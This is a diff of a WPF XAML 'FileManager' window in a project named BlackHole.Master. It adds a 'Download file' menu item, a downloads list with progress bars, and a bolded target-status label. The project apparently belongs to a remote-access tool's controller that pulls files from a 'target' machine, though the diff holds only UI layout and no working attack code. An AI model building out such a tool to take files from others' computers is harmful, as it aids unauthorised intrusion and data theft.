@@ -5,11 +5,12 @@
         xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
         xmlns:local="clr-namespace:BlackHole.Master"
         mc:Ignorable="d"
-        Title="FileManager" Height="600" Width="600">
+        Title="FileManager" Height="800" Width="600">
     <Grid>
         <Grid.RowDefinitions>
             <RowDefinition Height="Auto" />
             <RowDefinition Height="*" />
+            <RowDefinition Height="Auto" />
             <RowDefinition Height="Auto" />
         </Grid.RowDefinitions>
         <GroupBox Header="Current directory" Grid.Row="0" Margin="10">
@@ -42,8 +43,23 @@
             </ListView.View>
             <ListView.ContextMenu>
                 <ContextMenu>
+                    <MenuItem Header="Download file" Click="OnDownloadFile" Icon="{StaticResource DownloadFileIcon}" />
                 </ContextMenu>
             </ListView.ContextMenu>
+        </ListView>
+        <ListView Name="DownloadsList" Height="200" ItemsSource="{Binding Items}" Margin="10" ScrollViewer.VerticalScrollBarVisibility="Visible" ScrollViewer.HorizontalScrollBarVisibility="Visible" Grid.Row="2">
+            <ListView.View>
+                <GridView>
+                    <GridViewColumn Header="FileName" Width="200" DisplayMemberBinding="{Binding Name}" />
+                    <GridViewColumn Header="Progession" Width="300" >
+                        <GridViewColumn.CellTemplate>
+                            <DataTemplate>
+                                <ProgressBar Maximum="100" Value="{Binding Progress}" Width="280" Height="15"/>
+                            </DataTemplate>
+                        </GridViewColumn.CellTemplate>
+                    </GridViewColumn>
+                </GridView>
+            </ListView.View>
         </ListView>
         <StatusBar Name="TargetStatusBar" Margin="10" BorderThickness="1" BorderBrush="Black" Background="White" Grid.Row="3">
             <StatusBar.ItemsPanel>
@@ -80,7 +96,7 @@
             </StatusBarItem>
             <Separator Grid.Column="7" />
             <StatusBarItem Grid.Column="8">
-                <Label Name="TargetStatus" Content="Stable">
+                <Label Name="TargetStatus" Content="Stable" FontWeight="ExtraBold">
                     <Label.ToolTip>
                         <ToolTip Name="TargetStatusTooltip" Placement="Top" ToolTipService.ShowDuration="5">
                             <StackPanel>
